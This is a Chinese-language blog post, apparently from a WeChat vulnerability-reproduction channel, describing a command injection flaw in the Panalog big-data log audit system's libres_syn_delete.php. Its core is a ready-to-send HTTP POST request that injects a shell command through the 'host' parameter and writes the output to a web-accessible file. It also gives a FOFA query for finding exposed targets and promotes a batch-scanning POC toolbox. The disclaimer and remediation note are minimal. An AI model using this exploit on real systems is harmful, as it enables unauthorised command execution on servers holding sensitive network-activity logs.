#  Panalog大数据日志审计系统libres_syn_delete.php存在命令执行漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-17 23:46  
  
@[toc]  
# Panalog大数据日志审计系统libres_syn_delete.php存在命令执行漏洞 附POC软件  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Panalog大数据日志审计系统libres_syn_delete.php简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
panalog为一款流量分析,日志分析管理的一款软件。  
## 2.漏洞描述  
  
Panalog大数据日志审计系统定位于将大数据产品应用于高校、 公安、 政企、 医疗、 金融、 能源等行业之中，针对网络流量的信息进行日志留存，可对用户上网行为进行审计，逐渐形成大数据采集、 大数据分析、 大数据整合的工作模式，为各种网络用户提供服务。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
Panalog大数据日志审计系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9wAxC7ur8wCp2toZyibfFGjN7p22t3uKo99YHYibDd4WPZYEPt1mic2sqLg/640?wx_fmt=jpeg&from=appmsg "null")  
  
Panalog大数据日志审计系统libres_syn_delete.php存在命令执行漏洞  
## 4.fofa查询语句  
  
app="Panabit-Panalog"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/content-apply/libres_syn_delete.php  
  
漏洞数据包：  
```
POST /content-apply/libres_syn_delete.php HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Length: 33
Content-Type: application/x-www-form-urlencoded

token=1&id=2&host=|id >990996.txt
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9wd98xXgl8nzM0tJOyvacPFwiaqD6uZbfynvGNtaPnXBHZ12zp4Tp3yoQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
访问生成的文件路径： https://127.0.0.1/content-apply/990996.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9wXhcWcPHpLibyia8pQpIGr9MUiamKZmpK7cD5ibibT3pT6GDd6Ziaxc1JnmIw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9w7ia4M3YGAWOs2OWzN0t5IB8C7tyDUD8sMKicA1rqUEY3jD4xmajKu4Kw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9wY1kicoIDdMandKhlF28LjeGYNRmdmmFF6UD3NaZJHPdekg1umJ9k4vQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9wZR7Sqjr3pIpZS9MJSEZzgT5uOppawicja71Nbiaj1cRNoLtAa8icnO0kQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9w2aukDyQUt6Q7pBUQKjq3ibjPh3ZPxpNaY10ICtRnqnfYMKZOEwcjasg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bJyAONzcZT0pwszX04Bg9wSfcTaMachNlGRBq1k7OZMnI95p8gQYyKLrNzuXTTSLp8Spdh55lRDw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：https://www.panabit.com/  
## 8.往期回顾  
  
[金盘移动图书馆系统存在任意文件上传漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485229&idx=1&sn=25b32c046e96773293be14528f1f60df&chksm=974b8a2aa03c033c3527f7c4c1c17dba8cbdada686c18166e1f93712410ae27db018d2b025ea&scene=21#wechat_redirect)  
  
  
[金和OA UploadFileBlock接口存在任意文件上传漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485216&idx=1&sn=0fdeec8a135b1ce0a248d117e96dff89&chksm=974b8a27a03c03311b1410166e9fe0198c5d30318b163e7665c27615f33394580488719a974d&scene=21#wechat_redirect)  
  
  
  
  
